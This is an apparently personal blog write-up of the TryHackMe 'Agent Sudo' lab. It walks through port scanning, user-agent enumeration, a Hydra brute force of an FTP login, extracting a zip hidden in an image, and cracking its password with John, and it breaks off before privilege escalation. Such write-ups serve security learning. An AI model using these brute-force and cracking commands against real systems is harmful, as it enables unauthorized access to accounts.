---
title: "TryHackMe: Agent Sudo"
categories:
  - Blog
  - TryHackMe
tags:
  - pwn
  - root
---

The Nmap scan returns 3 open ports
```
└─$ nmap -sV 10.10.83.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 17:34 GMT
Nmap scan report for 10.10.83.69
Host is up (0.080s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
I began by enumerating port 80 (HTTP) via the web browser

![image](https://github.com/user-attachments/assets/c1f4a4be-b945-4a8a-9799-75b6178b16f8)

Agent R is telling us to change our user-agent to our own codename. We can do this by changing the user-agent tag in burpsuite or using curl. For this I used curl with the user-agent "R".
```
└─$ curl -A R 10.10.83.69
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
<title>Annoucement</title>
</head>
 <body>
<p>
Dear agents,
<br><br>
Use your own <b>codename</b> as user-agent to access the site.
<br><br>
From,<br>
Agent R
</p>
</body>
</html> 
```
This has yielded a differnt page to before! Through the fact agent R says "Are you one of the 25 employees?" makes me thing the agents are named alphabetically, e.g. Agent A, Agent B, Agent C, etc. We can attmept to change the user-agent to differnet characters of the alphabet, however I am going to use a bash script to automate this:
```
#!/bin/bash
for letter in {A..Z}; do
    curl -L -A $letter 10.10.83.69; echo "Letter: $letter"
done
```
Running and evaluating the results from the script, we can see that user-agent of Agent C gives a different repsonce to the others.
```
Attention chris, <br><br>
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
From,<br>
Agent R
```
We now know that their is user named: chris, and that his password is weak. We can try to brute-force the ftp login with username "chris". To do this I will be using Hydra Password Cracker
```
└─$ hydra -l chris -P WordLists/rockyou.txt 10.10.83.69 ftp
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-07 17:58:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.83.69:21/
[21][ftp] host: 10.10.83.69   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
```
Bingo! We successfully cracked the ftp password as "crystal"
```
ftp> dir
229 Entering Extended Passive Mode (|||55284|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png 
```
We have 3 files, examining the "To_agentJ.txt" file gives us:
```
└─$ cat To_agentJ.txt
Dear agent J,
All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
From,
Agent C
```
This tells us that their is a password stored inside the image, to retrieve this we can use the Binwalker tool
```
└─$ binwalk cute-alien.jpg
/usr/lib/python3/dist-packages/binwalk/core/magic.py:431: SyntaxWarning: invalid escape sequence '\.'
self.period = re.compile("\.")
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```
This contains no embedded file, lets try the other image: cuteie.png:
```
└─$ binwalk cutie.png
/usr/lib/python3/dist-packages/binwalk/core/magic.py:431: SyntaxWarning: invalid escape sequence '\.'
self.period = re.compile("\.")
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
Ah, we have found the embedded image. We can extract this with the -e flag
```
└─$ binwalk -e cutie.png
```
Now we can change our directly and view the hidden files content
```
└─$ cd _cutie.png.extracted/; ls -la
total 324
drwxr-xr-x 2 ben ben   4096 Jan  7 18:09 .
drwxr-xr-x 3 ben ben   4096 Jan  7 18:09 ..
-rw-r--r-- 1 ben ben 279312 Jan  7 18:09 365
-rw-r--r-- 1 ben ben  33973 Jan  7 18:09 365.zlib
-rw-r--r-- 1 ben ben    280 Jan  7 18:09 8702.zip
```
```
└─$ file 8702.zip
8702.zip: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
```
We have a zlip file, however it is password protected. We can use john to try crack the hash for the file. Firstly we will convert the zip file into a hash:
```
└─$ zip2john 8702.zip > zippedzip.txt
```
Then we can now use john to crack the hash. This may require sudo privilages.
```
└─$ sudo john --format=zip zippedzip.txt
[sudo] password for ben:
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 16 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE 2/3 (2025-01-07 18:14) 4.000g/s 279600p/s 279600c/s 279600C/s 123456..skyline!
```
The password we have found is "alien". We can now open our password protected zip file.
```
└─$ 7z x 8702.zip -palien
7-Zip 24.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19
64-bit locale=en_US.UTF-8 Threads:16 OPEN_MAX:1024
Scanning the drive for archives:
1 file, 280 bytes (1 KiB)
Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280
Everything is Ok
Size:       86
Compressed: 280 
```
We can now access the content of the file. Accessing this we find a "To_agentR.txt" file.
```

```

